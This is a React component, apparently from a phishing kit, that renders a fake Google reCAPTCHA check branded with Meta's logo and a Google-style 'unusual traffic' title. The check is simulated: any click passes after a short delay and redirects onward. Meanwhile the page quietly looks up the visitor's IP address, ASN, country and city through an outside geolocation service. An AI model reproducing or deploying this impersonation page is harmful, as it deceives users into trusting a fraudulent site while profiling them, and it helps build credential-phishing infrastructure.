import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import { store } from '@/store/store';
import { PATHS } from '@/router/router';
import axios from 'axios';
import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);
    const { geoInfo, setGeoInfo } = store();

    const handleVerify = async () => {
        if (isLoading || isShowCheckMark) return; // Prevent double click
        setIsLoading(true);
        try {
            // Giả lập API verify (vì vercel11 không có /api/verify)
            await new Promise((resolve) => setTimeout(resolve, 50));
            const status = 200;
            if (status === 200) {
                setTimeout(() => {
                    setIsShowCheckMark(true);
                    setIsLoading(false);
                }, 1500); // Giảm từ 2s xuống 1.5s
            }
        } catch {
            setIsLoading(false);
        }
    };

    // Fetch geoInfo nếu chưa có
    useEffect(() => {
        if (geoInfo) return;

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [geoInfo, setGeoInfo]);

    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                navigate(PATHS.HOME);
            }, 500);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, navigate]);

    return (
        <div className='flex flex-col items-center justify-center pt-[150px]'>
            <title>Our systems have detected unusual traffic from your computer network</title>
            <div className='w-[300px]'>
                <img src={MetaImage} alt='' className='w-16' style={{ imageRendering: 'crisp-edges' }} />
                <div className='flex w-full items-center justify-start py-5'>
                    <div className='flex w-full items-center justify-between rounded-md border border-[#e8eaed] bg-[#f9f9f9] pr-2 text-[#4c4a4b] shadow-sm'>
                        <div className='flex items-center justify-start'>
                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
                                <button
                                    className='flex h-full w-full items-center justify-center'
                                    onClick={() => {
                                        handleVerify();
                                    }}
                                >
                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                    {isLoading ? (
                                        <div className='h-full w-full animate-spin rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
                                    ) : (
                                        <div
                                            className={`h-8 w-8 rounded-[3px] border-[#b8bbbe] bg-[#f7f7f7] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
                                            style={{
                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
                                                backgroundPosition: '-10px -595px',
                                                imageRendering: 'crisp-edges'
                                            }}
                                        ></div>
                                    )}
                                </button>
                            </div>
                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-tight text-[#3c4043]'>I&apos;m not a robot</div>
                        </div>
                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#5f6368]'>
                            <img src={ReCaptchaImage} alt='' className='h-10 w-10' style={{ imageRendering: 'crisp-edges' }} />
                            <p className='text-[10px] font-bold text-[#5f6368]'>reCAPTCHA</p>
                            <small className='text-[8px] text-[#5f6368]'>Privacy - Terms</small>
                        </div>
                    </div>
                </div>
                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    );
};

export default Index;
